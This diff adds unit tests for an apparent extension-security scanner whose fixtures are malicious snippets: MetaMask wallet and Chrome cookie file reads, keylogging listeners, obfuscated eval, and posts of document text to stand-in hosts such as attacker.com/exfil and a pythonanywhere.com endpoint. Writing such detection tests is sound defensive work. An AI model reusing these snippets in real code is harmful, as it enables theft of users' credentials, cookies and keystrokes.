@@ -94,6 +94,101 @@ describe("checkPatterns", () => {
   });
 });
 
+describe("checkPatterns - high-risk patterns", () => {
+  it("detects cryptocurrency wallet access", () => {
+    const contents = makeContents({
+      "extension.js": `
+        const walletPath = process.env.APPDATA + '/MetaMask';
+        const data = fs.readFileSync(walletPath);
+      `,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "CRYPTO_WALLET")).toBe(true);
+    expect(findings.find((f) => f.id === "CRYPTO_WALLET")?.severity).toBe("high");
+  });
+
+  it("detects phantom wallet reference", () => {
+    const contents = makeContents({
+      "extension.js": `const phantomWallet = require('phantom');`,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "CRYPTO_WALLET")).toBe(true);
+  });
+
+  it("detects keylogger-like patterns", () => {
+    const contents = makeContents({
+      "extension.js": `
+        document.addEventListener('keydown', (e) => {
+          sendToServer(e.key);
+        });
+      `,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "KEYLOGGER_PATTERN")).toBe(true);
+  });
+
+  it("detects VS Code text document change listener", () => {
+    const contents = makeContents({
+      "extension.js": `
+        vscode.workspace.onDidChangeTextDocument((event) => {
+          logChanges(event.document.getText());
+        });
+      `,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "KEYLOGGER_PATTERN")).toBe(true);
+  });
+
+  it("detects network data exfiltration pattern", () => {
+    const contents = makeContents({
+      "extension.js": `
+        const content = document.getText();
+        axios.post('https://attacker.com/exfil', { data: content });
+      `,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "NETWORK_EXFIL")).toBe(true);
+  });
+
+  it("detects browser storage access", () => {
+    const contents = makeContents({
+      "extension.js": `
+        const chromePath = process.env.APPDATA + '/Google\\\\Chrome/User Data/Default/Cookies';
+        const cookies = fs.readFileSync(chromePath);
+      `,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "BROWSER_STORAGE")).toBe(true);
+  });
+
+  it("detects obfuscated code patterns", () => {
+    const contents = makeContents({
+      "extension.js": `
+        const _0x1234 = '\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64';
+        eval(_0x1234);
+      `,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "OBFUSCATED_CODE")).toBe(true);
+  });
+
+  it("detects PythonAnywhere exfiltration domain", () => {
+    const contents = makeContents({
+      "extension.js": `fetch('https://attacker123.pythonanywhere.com/receive')`,
+    });
+
+    const findings = checkPatterns(contents);
+    expect(findings.some((f) => f.id === "PYTHONANYWHERE")).toBe(true);
+  });
+});
+
 describe("checkAllPatterns", () => {
   it("detects native binary files", () => {
     const contents = makeContents({
